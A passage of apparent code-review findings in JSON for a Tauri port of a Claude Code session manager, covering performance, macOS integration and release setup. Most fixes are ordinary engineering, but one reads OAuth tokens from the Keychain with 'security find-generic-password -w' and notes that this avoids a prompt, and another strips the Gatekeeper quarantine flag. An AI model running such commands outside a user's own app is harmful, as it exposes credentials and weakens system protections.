+  "fix": "Make the frontend always call `pty_kill` on close (remove the `!tab.exited` check). In Rust, make Terms an Arc stored in state. When the reader thread hits EOF, remove the entry from the map and call child.wait() (or try_wait in a loop) to collect the real exit code. Send that code in PtyEvent::Exit instead of None. In kill(), call child.wait() after kill() on a background thread. Expected gain: memory and handle count stay flat over a long session.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Every tab keeps its own WebGL context and 10k-line scrollback",
+  "severity": "medium",
+  "where": "src/main.ts:384-407",
+  "problem": "Each tab loads a WebglAddon, even when it is hidden. Chromium/WebView2 allows only about 16 live WebGL contexts. With 17 or more tabs, the oldest one loses its context, gets disposed, and silently falls back to the slow DOM renderer. Each context also holds a texture atlas (several MB to tens of MB of GPU and shared memory). scrollback: 10000 at about 200 columns is up to about 24 MB of buffer per tab. Together these are a large part of the WebView's memory beyond its ~170 MB baseline.",
+  "fix": "Keep one WebglAddon only on the active tab. In showTab, dispose the previous tab's addon and load a new one on the tab being shown (store it as tab.gl). Lower scrollback to 5000, or make it a setting. Expected gain: GPU and shared memory become O(1) instead of O(number of tabs), roughly tens of MB saved per extra tab, and tabs never fall back to the DOM renderer.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Each title change rebuilds the whole tab strip",
+  "severity": "medium",
+  "where": "src/main.ts:429-434, 261-276",
+  "problem": "Claude Code updates the terminal title often (a status or spinner glyph while it works). Each onTitleChange calls renderTabs(), which replaces the innerHTML of every tab, re-runs styleEntering for all of them, and calls placeTabPill(), which forces offsetLeft/offsetWidth layout reads. With several busy tabs, this causes constant layout thrashing and drops hover state on the close buttons.",
+  "fix": "Update only that tab's text: `el.tabList.querySelector(`.tab[data-key=\"${tab.key}\"] .t-title\")!.textContent = t`, and skip the update if the value is unchanged. Throttle it to one update per animation frame. Call placeTabPill only if the active tab's width changed. Expected gain: removes repeated full DOM rebuilds and forced layouts while sessions are working.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Resize is not debounced, so ConPTY gets a resize call on every frame of a window drag",
+  "severity": "low",
+  "where": "src/main.ts:428, 465-468",
+  "problem": "The ResizeObserver calls fit.fit() on every frame. Each cols/rows change triggers term.onResize, then pty_resize, which is a sync main-thread command. Each ConPTY resize makes Claude's TUI reflow and repaint completely, which floods the output channel during a drag.",
+  "fix": "Keep fit.fit() on each frame for the visual layout, but debounce the pty_resize invoke (about 80 ms trailing) and send only the last cols/rows. Make pty_resize async (see the pty_write finding). Expected gain: one repaint per drag instead of dozens.",
+  "dimension": "performance"
+ },
+ {
+  "title": "macOS starts a login shell for every tab",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:41-47",
+  "problem": "`$SHELL -l -c 'exec claude ...'` sources .zprofile/.zshrc (nvm, oh-my-zsh, conda) for every new tab, which commonly adds 0.3-2 s before claude starts.",
+  "fix": "At app start, on a background thread, run `$SHELL -l -c 'printf %s \"$PATH\"'` once and cache the result in a OnceLock<String>. Spawn `claude` directly with CommandBuilder::new(\"claude\") and cmd.env(\"PATH\", cached), falling back to the login-shell path only if the lookup failed. Expected gain: opening a tab on macOS is 0.3-2 s faster.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Window appears before its content: white flash and an empty sidebar",
+  "severity": "low",
+  "where": "src-tauri/tauri.conf.json:13-21, src/main.ts:474-489",
+  "problem": "The window is shown right away with WebView2's default white background, which is visible in dark mode. Its content waits on list_profiles, then the full list_projects scan, one after the other, so the app feels slower to start than it is.",
+  "fix": "Set `\"visible\": false` and `\"backgroundColor\"` (a dark or light value) on the window. In main.ts, call getCurrentWindow().show() after the first renderTabs/renderHome, before the scan finishes (requires `core:window:allow-show` in capabilities/default.json). Start list_profiles and list_projects together with Promise.all. Expected gain: no flash, and the frame appears about 100-200 ms sooner.",
+  "dimension": "performance"
+ },
+ {
+  "title": "WebView2 memory is not reduced when the app is in the background",
+  "severity": "low",
+  "where": "src-tauri/src/lib.rs:46-57",
+  "problem": "The WebView2 baseline is about 170 MB and stays there while the app is minimized. The rewrite has no idle-memory handling.",
+  "fix": "On Windows, in setup(), call window.with_webview(|wv| ...). Get ICoreWebView2_19 from wv.controller().CoreWebView2() and set MemoryUsageTargetLevel to COREWEBVIEW2_MEMORY_USAGE_TARGET_LEVEL_LOW on WindowEvent::Focused(false) or when minimized, and back to NORMAL on focus. This needs the `webview2-com` crate under a cfg(windows) dependency. Expected gain: typically 30-50% lower working set while the window is in the background.",
+  "dimension": "performance"
+ },
+ {
+  "title": "panic = \"abort\" turns any parser or reader panic into an app crash",
+  "severity": "low",
+  "where": "src-tauri/Cargo.toml:34, src-tauri/src/sessions.rs:105, src-tauri/src/pty.rs:83",
+  "problem": "The release profile is otherwise well tuned (lto, codegen-units=1, opt-level 3, strip). But with panic=abort, `h.join().unwrap_or_default()` can never recover a panicked scan thread. Any panic, such as a slicing bug on an odd transcript, kills the whole app and every running Claude terminal with it. The dev profile also compiles serde_json and portable-pty unoptimized, so dev-mode scans are about 10x slower and give misleading performance numbers.",
+  "fix": "Remove `panic = \"abort\"` (the size cost is about 100-200 KB) so that join() and spawn_blocking errors stay contained. Add `[profile.dev.package.\"*\"] opt-level = 2` so dev builds scan at close to release speed.",
+  "dimension": "performance"
+ },
+ {
+  "title": "Search re-lowercases every label on each keystroke, and STATES is never pruned",
+  "severity": "low",
+  "where": "src/main.ts:128-135, 227; src-tauri/src/sessions.rs:181",
+  "problem": "visibleProjects() rebuilds every project object and calls toLowerCase() on every label for each keystroke, with no debounce. It is also called again from toggleProject and renderHome. In Rust, STATES keeps entries for deleted transcripts forever.",
+  "fix": "In refresh(), precompute `p.key = (name+path).toLowerCase()` and `s.key = label.toLowerCase()` once. Debounce the search input by about 80 ms. In projects(), keep only the STATES entries whose paths are in the current `files` set (retain).",
+  "dimension": "performance"
+ },
+ {
+  "title": "Login shell skips ~/.zshrc, so claude is often not found when launched from Finder",
+  "severity": "blocker",
+  "where": "src-tauri/src/pty.rs:41-48",
+  "problem": "`$SHELL -l -c 'exec claude ...'` starts a login shell that is not interactive. zsh then reads /etc/zprofile, ~/.zprofile and ~/.zlogin, but not ~/.zshrc. Claude's native installer (~/.local/bin), nvm/fnm/volta and most PATH edits live in ~/.zshrc, so a Finder-launched app shows 'zsh:1: command not found: claude' and the tab just ends. Every tab also pays the full shell startup cost (oh-my-zsh, p10k).",
+  "fix": "Resolve the environment once at startup, off the UI thread, with a 5s timeout: run `$SHELL -ilc 'printf \"__CM__%s__CM__%s\" \"$(command -v claude)\" \"$PATH\"'` and parse between the markers. Cache the claude path and PATH in a OnceLock. If the lookup returns nothing, try ~/.local/bin/claude, ~/.claude/local/claude, /opt/homebrew/bin/claude and /usr/local/bin/claude. Then spawn `CommandBuilder::new(<abs claude path>)` directly with `cmd.env(\"PATH\", cached_path)`, the same way as on Windows. If nothing is found, return the error 'claude not found - install Claude Code or add it to PATH' from pty_spawn. For the default shell, read the pw_shell field of getpwuid(getuid()) instead of $SHELL.",
+  "dimension": "macos"
+ },
+ {
+  "title": "No LANG or LC_ALL for Finder-launched apps, so the child runs in the C locale",
+  "severity": "high",
+  "where": "src-tauri/src/pty.rs:60-61",
+  "problem": "launchd gives GUI apps no LANG. Terminal.app and iTerm set it themselves, but this app does not. claude and its shell tools (git, less, ls, Bash tool output) then run with a non-UTF-8 locale, which breaks box drawing, emoji and file names with accents.",
+  "fix": "In claude_command, under #[cfg(unix)], add `if std::env::var_os(\"LANG\").is_none() { cmd.env(\"LANG\", \"en_US.UTF-8\"); }`. Also set `cmd.env(\"TERM_PROGRAM\", \"ClaudeManager\")`.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Ctrl+C copies instead of interrupting, and Ctrl+V is swallowed (breaks Claude's image paste)",
+  "severity": "blocker",
+  "where": "src/main.ts:414-423",
+  "problem": "The handler treats `e.ctrlKey || e.metaKey` the same way. On a Mac, Ctrl+C must always send SIGINT/ESC to Claude, but while any xterm selection is visible it copies instead, and Claude keeps running. Ctrl+V returns false, so ^V never reaches the PTY. On macOS, Claude Code pastes clipboard images on Ctrl+V (it reads the clipboard itself), and WebKit fires no paste event on Ctrl+V, so the key does nothing.",
+  "fix": "Add `const isMac = navigator.userAgent.includes(\"Mac\")` and use `const mod = isMac ? e.metaKey && !e.ctrlKey : e.ctrlKey && !e.metaKey;` in place of `(e.ctrlKey || e.metaKey)`. On Mac only Cmd+C and Cmd+V are intercepted, and Ctrl+C and Ctrl+V always pass through to the PTY.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Option key is not Meta: Option+Enter, Option+P and Option+T don't work in Claude",
+  "severity": "high",
+  "where": "src/main.ts:384-394 (Terminal options)",
+  "problem": "xterm's default `macOptionIsMeta: false` turns Option+key into composed characters (Option+P gives π, Option+Enter gives a plain CR, which submits the prompt). Claude Code's Mac shortcuts (Option+Enter for a newline, Option+P model picker, Option+T thinking toggle, Option+B/F word moves) all need Meta. Shift+Enter also sends a bare \\r and submits.",
+  "fix": "Add `macOptionIsMeta: isMac, macOptionClickForcesSelection: isMac` to the Terminal options, and later add a setting for users of non-US layouts who need Option for accented characters. In the custom key handler, map Shift+Enter to `send(\"\\x1b\\r\")` and return false. Optionally map Cmd+Left to \\x01, Cmd+Right to \\x05, Cmd+Backspace to \\x15 and Cmd+K to term.clear(), like Terminal.app and iTerm.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Default macOS menu: Cmd+W closes the whole window and Cmd+Q quits, killing every session without asking",
+  "severity": "blocker",
+  "where": "src-tauri/src/lib.rs:46-57",
+  "problem": "No menu is set, so Tauri adds its default macOS menu: File > Close Window (Cmd+W) and App > Quit (Cmd+Q). Mac users press Cmd+W to close a tab. Here that destroys the window, and the Destroyed handler (lib.rs:51-55) kills every running claude PTY at once, with no confirmation. The app also has no shortcuts of its own (new tab, close tab, next/previous tab, Cmd+1..9, Cmd+F search, Cmd+, settings, refresh), which the Windows app has (Ctrl+F and F5 at ClaudeManager.ps1:1937-1939).",
+  "fix": "Build a custom menu in `.setup()` with tauri::menu: the app submenu (about, services, hide, hide_others, show_all, separator, quit), an Edit submenu of PredefinedMenuItem undo/redo/cut/copy/paste/select_all (still needed so WKWebView copy/paste works), and a Shell/File submenu with custom items: 'New Session' (CmdOrCtrl+T), 'Close Tab' (CmdOrCtrl+W), 'Next Tab' (Cmd+Shift+]), 'Previous Tab' (Cmd+Shift+[), 'Find' (CmdOrCtrl+F), 'Refresh' (CmdOrCtrl+R). Emit them to the frontend with `app.on_menu_event(|app, e| app.emit(\"menu\", e.id().0.clone()))`. Handle `WindowEvent::CloseRequested { api, .. }` and `RunEvent::ExitRequested`: if any PTY is alive, call `api.prevent_close()` and ask the frontend to confirm ('N sessions are running. Quit anyway?').",
+  "dimension": "macos"
+ },
+ {
+  "title": "Closing the window ends the app and its sessions, and the Dock icon does not reopen it",
+  "severity": "medium",
+  "where": "src-tauri/src/lib.rs:51-56",
+  "problem": "On a Mac, closing the main window normally keeps the app running, and clicking the Dock icon brings the window back. Here closing the window kills every terminal and the app exits. That is the opposite of what a session manager should do, and the Windows app keeps its tray icon (ClaudeManager.ps1:951).",
+  "fix": "On macOS, handle CloseRequested with `api.prevent_close(); window.hide()`. Switch to `.build(ctx)?.run(|app, ev| ...)` and on `RunEvent::Reopen { .. }` call `app.get_webview_window(\"main\").unwrap().show()` and `.set_focus()`. Kill the PTYs only on `RunEvent::Exit`, after a confirmed quit.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Standard macOS title bar stacks above the custom tab strip; no traffic-light overlay or drag region",
+  "severity": "high",
+  "where": "src-tauri/tauri.conf.json:13-21; index.html:11-26; src/styles.css:43,73",
+  "problem": "The window uses the default decorated title bar, so the Mac version shows a grey 28px title bar with 'Claude Manager', then the sidebar header and tab strip below it. That looks clearly non-native next to the Windows app's custom title bar with traffic lights. No element has data-tauri-drag-region, and the capability does not allow start-dragging.",
+  "fix": "In the window config set `\"titleBarStyle\": \"Overlay\", \"hiddenTitle\": true, \"trafficLightPosition\": { \"x\": 14, \"y\": 18 }` (keep the decorations on Windows; a platform config file such as tauri.macos.conf.json keeps it macOS only). Add `data-tauri-drag-region` to `.side-head` and `.tabs`. Add `\"core:window:allow-start-dragging\"` to capabilities/default.json. Pad the sidebar so the lights don't overlap the 'Workspace' title, e.g. `.side-head{padding-top:38px}` under a `html.mac` class set from main.ts. In fullscreen the lights disappear, so drop that padding when `getCurrentWindow().isFullscreen()` is true. Optionally add `\"windowEffects\": {\"effects\": [\"sidebar\"]}` with `\"transparent\": true` and a semi-transparent `--side` for native sidebar vibrancy.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Usage/plan limits and 'signed-in' detection will not port: Claude Code on macOS keeps OAuth tokens in the Keychain",
+  "severity": "high",
+  "where": "src-tauri/src/sessions.rs:55-71 (and future port of MacUI.cs:1893-1936 / ClaudeManager.ps1:128,1063)",
+  "problem": "The Windows app reads `<profile>/.credentials.json` (claudeAiOauth.accessToken and subscriptionType) to show plan limits, and treats that file as the sign-in marker. On macOS this file does not exist. Claude Code stores the token in the login Keychain as a generic password: service 'Claude Code-credentials' for the default ~/.claude, and 'Claude Code-credentials-<first 8 hex of sha256(CLAUDE_CONFIG_DIR)>' for other config dirs, with the macOS user name as the account. A straight port shows every Mac profile as 'Not signed in'. sessions.rs:68 also lists only profiles that have a projects/ folder, so a profile that is signed in but has no sessions yet never appears.",
+  "fix": "Add a `credentials(profile_dir) -> Option<serde_json::Value>` that reads `<dir>/.credentials.json` on Windows and Linux. On macOS it runs `/usr/bin/security find-generic-password -s <service> -a $USER -w` and parses stdout as JSON. Going through /usr/bin/security avoids a Keychain prompt, because Claude Code created the item with that tool and its ACL trusts it. A keychain crate would prompt on every launch for an unsigned app. Compute the suffix with sha2: `format!(\"-{}\", &hex(sha256(dir))[..8])` only for non-default dirs. Verify it against `security dump-keychain | grep 'Claude Code-credentials'` on a real Mac. Never write to the item. Keep pty.rs:56-59 (not setting CLAUDE_CONFIG_DIR for ~/.claude), because setting it would change the service name and log the user out.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Docs and CI say 'right-click > Open'; macOS 15 removed that, and unsigned or ad-hoc builds show as 'damaged'",
+  "severity": "blocker",
+  "where": ".github/workflows/build.yml:1-3,44-46; README.md:23-26; src-tauri/tauri.conf.json:26-36",
+  "problem": "The build is not signed or notarized, and tauri-action gets no APPLE_* env. On macOS 15 (Sequoia) right-click > Open no longer bypasses Gatekeeper, and a quarantined, unsigned universal .app downloaded from the GitHub artifact usually shows 'is damaged and can't be opened'. A production release needs Developer ID signing, the hardened runtime and notarization. Unsigned builds also lose TCC grants on every rebuild, and macOS notifications (needed for parity with the tray toasts at ClaudeManager.ps1:950-980) require a signed bundle.",
+  "fix": "Add `\"macOS\": { \"signingIdentity\": \"-\", \"minimumSystemVersion\": \"12.0\", \"hardenedRuntime\": true }` to tauri.conf.json bundle; '-' gives at least an ad-hoc signature for test builds. For releases, pass these to tauri-action as `env:` from secrets: APPLE_CERTIFICATE (base64 .p12), APPLE_CERTIFICATE_PASSWORD, APPLE_SIGNING_IDENTITY ('Developer ID Application: ... (TEAMID)'), APPLE_ID, APPLE_PASSWORD (app-specific), APPLE_TEAM_ID (or APPLE_API_KEY/APPLE_API_ISSUER/APPLE_API_KEY_PATH). Tauri then signs, notarizes and staples. Change the README and the workflow comment to: 'unsigned build: System Settings > Privacy & Security > Open Anyway, or `xattr -dr com.apple.quarantine \"/Applications/Claude Manager.app\"`'.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Do not enable App Sandbox; no entitlements needed, but document why",
+  "severity": "medium",
+  "where": "src-tauri/tauri.conf.json:26 (bundle.macOS absent)",
+  "problem": "With the App Sandbox (com.apple.security.app-sandbox), as required for the Mac App Store, the app could not read ~/.claude*, spawn claude through a PTY, or reach the user's Keychain items. Someone could add it later while 'hardening' for release.",
+  "fix": "Distribute through Developer ID and a DMG only. Keep the default hardened runtime with no entitlements file: WKWebView's JIT runs in WebKit's own XPC processes, and claude, a separately signed binary, carries its own entitlements. Add a comment to README saying the sandbox must stay off and the Mac App Store is not a target.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Info.plist has no privacy usage strings, so TCC prompts for project folders in ~/Documents and ~/Desktop have no reason text",
+  "severity": "medium",
+  "where": "src-tauri/ (no Info.plist); src-tauri/src/pty.rs:49",
+  "problem": "TCC charges the claude child to the responsible app, Claude Manager. Opening a session whose cwd is in ~/Documents, ~/Desktop, ~/Downloads, iCloud Drive or an external volume triggers 'Claude Manager would like to access files in your Documents folder' with no explanation, and a denial gives the user unexplained EPERM errors inside Claude. The bundle also lacks an app category.",
+  "fix": "Add src-tauri/Info.plist (Tauri 2 merges it automatically) with NSDocumentsFolderUsageDescription, NSDesktopFolderUsageDescription, NSDownloadsFolderUsageDescription, NSRemovableVolumesUsageDescription and NSNetworkVolumesUsageDescription, each set to 'Claude Code sessions you start run in your project folders.' Add NSAppleEventsUsageDescription too, because claude and its tools can call osascript. Set `\"category\": \"DeveloperTool\"` and `\"copyright\"` in tauri.conf.json bundle.",
+  "dimension": "macos"
+ },
+ {
+  "title": "'SF Mono' is not available to WebKit by name, so terminals render in Menlo",
+  "severity": "medium",
+  "where": "src/main.ts:386",
+  "problem": "SF Mono ships inside Terminal.app and Xcode and is not installed system-wide. WKWebView exposes the system monospace font only as `ui-monospace`, so the stack quietly falls back to Menlo, which is not the font Mac users expect in a terminal.",
+  "fix": "Use `fontFamily: isWindows ? '\"Cascadia Mono\", \"Cascadia Code\", Consolas, monospace' : 'ui-monospace, \"SF Mono\", Menlo, Monaco, monospace'`. Check that xterm's WebGL glyph measurement picks it up; if not, call `document.fonts.ready` before `term.open`. Consider fontSize 12 on Mac to match Terminal.app's default density.",
+  "dimension": "macos"
+ },
+ {
+  "title": "`user-select: none` without -webkit- prefix: UI text is selectable in WKWebView",
+  "severity": "medium",
+  "where": "src/styles.css:37,99",
+  "problem": "WKWebView on current macOS versions still needs `-webkit-user-select`, and Vite adds no autoprefixer. On a Mac, dragging across the sidebar or tab strip selects text and Cmd+A highlights the whole UI, which is clearly non-native. `.path { user-select: text }` has the same problem in reverse.",
+  "fix": "Add `-webkit-user-select: none;` next to body's `user-select: none`, and `-webkit-user-select: text;` on `.path`. Also add `-webkit-user-drag: none` to svg and img, and `.tabs::-webkit-scrollbar{display:none}` next to `scrollbar-width:none` (styles.css:73) for older WebKit.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Spring wheel-scroll hijack fights trackpad momentum on Mac",
+  "severity": "medium",
+  "where": "src/spring.ts:78-94; src/main.ts:391,470-471",
+  "problem": "smoothScroll calls preventDefault on every wheel event and runs its own spring. Mac trackpads already send high-rate pixel deltas with OS inertia and rubber-banding, so the extra spring adds lag, removes the elastic bounce, and feels floaty and wrong. xterm's `smoothScrollDuration: 110` does the same inside terminals.",
+  "fix": "Skip the hijack on Mac: in smoothScroll return early when `navigator.userAgent.includes(\"Mac\")`, or at least when `e.deltaMode === 0 && !Number.isInteger(e.deltaY)` (trackpad). Set `smoothScrollDuration: isMac ? 0 : 110` in the Terminal options.",
+  "dimension": "macos"
+ },
+ {
+  "title": "WKWebView default context menu offers 'Reload', which kills all sessions",
+  "severity": "high",
+  "where": "src/main.ts:474-479",
+  "problem": "Right-click in WKWebView shows WebKit's default menu (Reload, Back, Inspect in debug builds). Reload re-runs DOMContentLoaded, which calls `pty_kill_all` and ends every running Claude session. There is also no terminal context menu (Copy, Paste, Clear), which Mac users expect.",
+  "fix": "Add `document.addEventListener(\"contextmenu\", e => { if (!(e.target as HTMLElement).closest(\"input,textarea:not(.xterm-helper-textarea)\")) e.preventDefault(); })`. For terminals, show a native menu through `@tauri-apps/api/menu` (Menu.new with Copy, which calls term.getSelection() and the clipboard; Paste; Select All, which calls term.selectAll(); Clear) using `menu.popup()`.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Clipboard: navigator.clipboard is unreliable in WKWebView; use the Tauri clipboard plugin",
+  "severity": "medium",
+  "where": "src/main.ts:417",
+  "problem": "`navigator.clipboard.writeText` in WKWebView needs transient user activation and a secure context, and it can fail silently (the promise is not awaited or caught). On Mac the copy then appears to work but the clipboard is unchanged.",
+  "fix": "Add tauri-plugin-clipboard-manager (Cargo dependency, `.plugin(tauri_plugin_clipboard_manager::init())`, capability `clipboard-manager:allow-write-text`) and call `writeText(term.getSelection())` from `@tauri-apps/plugin-clipboard-manager`, with `.catch(console.error)`. Also map Cmd+A in a terminal to `term.selectAll()`, because the Edit menu's Select All targets the DOM, not xterm.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Finder file drops are swallowed by Tauri's drag-drop handler",
+  "severity": "medium",
+  "where": "src-tauri/tauri.conf.json:14-20; src/main.ts (no drop handling)",
+  "problem": "`dragDropEnabled` defaults to true, so the native window catches file drops and the webview never gets them. Mac users drag files or images from Finder into Terminal or iTerm to paste their paths into Claude; here nothing happens.",
+  "fix": "In main.ts, `getCurrentWebview().onDragDropEvent(e => { if (e.payload.type === \"drop\" && active?.ptyId != null) invoke(\"pty_write\", { id: active.ptyId, data: e.payload.paths.map(shellQuote).join(\" \") + \" \" }); })`, with a JS shellQuote that matches pty.rs:65-71.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Links in terminal not clickable (OAuth /login URL, docs links)",
+  "severity": "medium",
+  "where": "src/main.ts:395-407",
+  "problem": "No WebLinksAddon is loaded. When `claude /login` cannot open a browser, or prints a URL to visit, Mac users expect to Cmd+click it, as in Terminal.app and iTerm. Plain clicks in the webview do nothing, and `opener:default` is granted but never used.",
+  "fix": "Add @xterm/addon-web-links and load `new WebLinksAddon((e, uri) => { if (isMac ? e.metaKey : e.ctrlKey) openUrl(uri); })`, with openUrl from @tauri-apps/plugin-opener (already a dependency).",
+  "dimension": "macos"
+ },
+ {
+  "title": "Child processes get SIGKILL, and the real exit code is never reported",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:103,123-133",
+  "problem": "On Unix, `child.kill()` sends SIGKILL to claude only. Claude cannot flush its transcript or stop its MCP servers, and processes started by its Bash tool are orphaned because the process group is not signalled. The Exit event always sends `code: None`, so a 127 from a missing claude or a crash looks the same as a normal exit.",
+  "fix": "In kill(), drop `t.writer` and `t.master` first. Closing the PTY master makes the kernel send SIGHUP to the session's foreground process group. Then, on a timer thread, after 2s call `libc::killpg(pid, SIGTERM)` and finally `t.child.kill()` if `try_wait()` is still None. Get the pid with `t.child.process_id()`. In the reader thread, keep an `Arc<Mutex<Box<dyn Child>>>`, call `wait()` after EOF, and send `Exit { code: Some(status.exit_code()) }`. In the frontend, map 127 to 'claude not found on PATH'.",
+  "dimension": "macos"
+ },
+ {
+  "title": "WebGL context per tab: WebKit caps active contexts at 16",
+  "severity": "low",
+  "where": "src/main.ts:401-407",
+  "problem": "Each tab creates a WebGL2 context and hidden tabs keep theirs. WebKit drops the oldest context once 16 are active, which silently pushes those tabs to the DOM renderer. onContextLoss handles it, but rendering then becomes uneven, and memory and GPU use grow on Mac laptops.",
+  "fix": "Load WebglAddon in showTab() for the active tab and dispose it in the tab being hidden, or cap it at the 8 most recent tabs. Keep the onContextLoss fallback.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Native form controls ignore the custom styling in WebKit",
+  "severity": "low",
+  "where": "src/styles.css:45-46; index.html:14,16",
+  "problem": "In WKWebView, `<select>` renders as a native popup button that ignores background and border, and `input[type=search]` gets WebKit's rounded search field with a cancel button. Padding and border-radius are partly overridden, so the sidebar header looks different from the Windows build.",
+  "fix": "Add `appearance:none; -webkit-appearance:none;` to select and #search, plus a CSS chevron background on select, and `#search::-webkit-search-cancel-button{-webkit-appearance:none}` (or keep a styled cancel button).",
+  "dimension": "macos"
+ },
+ {
+  "title": "Dark-mode white flash and no window state memory",
+  "severity": "low",
+  "where": "src-tauri/tauri.conf.json:14-20",
+  "problem": "The window opens with WKWebView's white background before CSS loads, which flashes in dark mode. Size and position are not saved between launches, while the Windows app keeps its settings.",
+  "fix": "Set `\"backgroundColor\": \"#1c1c1e\"` or `\"theme\"` per appearance in the window config, or create the window hidden (`\"visible\": false`) and call `getCurrentWindow().show()` after the first render. Add tauri-plugin-window-state.",
+  "dimension": "macos"
+ },
+ {
+  "title": "Project grouping is case-sensitive on case-insensitive APFS",
+  "severity": "low",
+  "where": "src-tauri/src/sessions.rs:111",
+  "problem": "The default macOS volume (APFS) is case-insensitive. A cwd recorded as /Users/x/Proj and another as /Users/x/proj become two projects, and NFD and NFC forms of accented folder names can split as well.",
+  "fix": "Use `if cfg!(any(windows, target_os = \"macos\")) { path.to_lowercase() }` for the key. Optionally normalize to NFC with the unicode-normalization crate.",
+  "dimension": "macos"
+ },
+ {
+  "title": "App ships with the default Tauri logo icons",
+  "severity": "blocker",
+  "where": "src-tauri/icons/* (icon.png, icon.ico, icon.icns); src-tauri/tauri.conf.json:28-34",
+  "problem": "src-tauri/icons/icon.png is the stock Tauri logo (yellow/teal rings), and so are the matching .ico, .icns and Square*Logo files. The installer, taskbar, Dock and Add/Remove Programs would all show the Tauri brand.",
+  "fix": "Make a 1024x1024 PNG with transparency and run `pnpm tauri icon app-icon.png`. This rebuilds every size, including a multi-resolution icon.ico and icon.icns. Commit the source PNG too. Keep the icon list in tauri.conf.json as it is.",
+  "dimension": "release"
+ },
+ {
+  "title": "No settings persistence at all (big parity gap with the PS1 app)",
+  "severity": "blocker",
+  "where": "src/main.ts (whole file, no localStorage/store/invoke for settings); src-tauri/src/lib.rs:47-57",
+  "problem": "The Windows app saves pinned, account, openIn, showPicker, lastProfile, groups, ungroupedCollapsed, showUsage, notify and bgTerms to %APPDATA%\\ClaudeManager\\settings.json (ClaudeManager.ps1:14-15, 98-119). The Tauri app saves nothing, so the profile choice, pins and groups are lost on every restart.",
+  "fix": "Add tauri-plugin-store (Cargo `tauri-plugin-store = \"2\"`, npm `@tauri-apps/plugin-store`, capability `store:default`). Another option is a small Rust `settings.json` written atomically (temp file, then rename) under `app.path().app_config_dir()`. That is %APPDATA%\\com.buddhi.claudemanager on Windows and ~/Library/Application Support/com.buddhi.claudemanager on macOS. Use the same schema as Load-Settings. On first run on Windows, import the old %APPDATA%\\ClaudeManager\\settings.json if it exists.",
+  "dimension": "release"
+ },
+ {
+  "title": "Bundle identifier is personal and must be fixed before the first public release",
+  "severity": "high",
+  "where": "src-tauri/tauri.conf.json:5",
+  "problem": "`com.buddhi.claudemanager` sets the app-data folder, the macOS bundle ID and keychain/notarization identity, and the Windows uninstall registry key. Changing it after v1.0 orphans user settings and breaks updates. Publisher and copyright are also unset, so NSIS shows the publisher as a value taken from the identifier.",
+  "fix": "Choose the final reverse-DNS ID now (for example `io.ceypay.claudemanager` or `com.ceylabs.claudemanager`) and freeze it. Add `bundle.publisher`, `bundle.copyright`, `bundle.category: \"DeveloperTool\"`, `bundle.shortDescription`, `bundle.longDescription` and `bundle.homepage`.",
+  "dimension": "release"
+ },
+ {
+  "title": "Version is set in three places",
+  "severity": "medium",
+  "where": "package.json:4; src-tauri/Cargo.toml:3; src-tauri/tauri.conf.json:4",
+  "problem": "0.1.0 is repeated in three files. They will drift apart, and the updater and the MSI both read the tauri.conf.json value. The MSI also rejects pre-release versions such as `1.0.0-beta.1`.",
+  "fix": "Remove `version` from tauri.conf.json so it falls back to Cargo.toml, or set it to `\"../package.json\"`. Bump that one source in a release script or with `cargo set-version`. Have CI fail when the git tag `vX.Y.Z` does not match it. Use only numeric versions while the MSI is built, or drop the MSI (see the installer finding).",
+  "dimension": "release"
+ },
+ {
+  "title": "No auto-updater",
+  "severity": "high",
+  "where": "src-tauri/Cargo.toml:20-25; src-tauri/src/lib.rs:47-48; src-tauri/tauri.conf.json (no plugins.updater / createUpdaterArtifacts); .github/workflows/build.yml:151-153",
+  "problem": "Users have no way to get fixes after v1.0 except reinstalling by hand. The bundle config does not create updater artifacts, so a CI release has no `latest.json` and no `.sig` files.",
+  "fix": "Run `pnpm tauri signer generate -w ~/.tauri/claude-manager.key`. Add `tauri-plugin-updater = \"2\"` and `tauri-plugin-process = \"2\"`, register both in lib.rs, and add `updater:default` and `process:allow-restart` to capabilities/default.json. In tauri.conf.json set `bundle.createUpdaterArtifacts: true` and `plugins.updater: { pubkey: \"<pub>\", endpoints: [\"https://github.com/CeyLabs/<repo>/releases/latest/download/latest.json\"] }`. Store TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD as repo secrets and pass them to tauri-action. In main.ts, call `check()` at startup and offer download, install and relaunch. Back up the private key: if it is lost, existing installs can never be updated.",
+  "dimension": "release"
+ },
+ {
+  "title": "CI only builds; it never creates a GitHub release and has no release permissions",
+  "severity": "high",
+  "where": ".github/workflows/build.yml:4-7, 42-52",
+  "problem": "tauri-action runs with no `tagName`, `releaseName` or `releaseDraft`, and with no `GITHUB_TOKEN`, so pushing a `v*` tag makes only workflow artifacts. Those expire after 90 days, and the updater has no `latest.json` to read. The job has no `permissions: contents: write`. No job runs on PRs to check `cargo clippy`, `cargo test` or `tsc` before a tag.",
+  "fix": "Add `permissions: contents: write`. On the tauri-action step, set `env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}` plus the signing secrets, and `with: tagName: ${{ github.ref_name }}, releaseName: 'Claude Manager ${{ github.ref_name }}', releaseDraft: true, prerelease: false, args: ${{ matrix.args }}`. Keep upload-artifact only for workflow_dispatch runs. Add a separate `check.yml` that runs on pull_request and push to main: `pnpm install --frozen-lockfile && pnpm build` and `cargo clippy --manifest-path src-tauri/Cargo.toml -- -D warnings` on windows-latest and macos-latest.",
+  "dimension": "release"
+ },
+ {
+  "title": "Windows builds are unsigned (SmartScreen warning, AV false positives)",
+  "severity": "high",
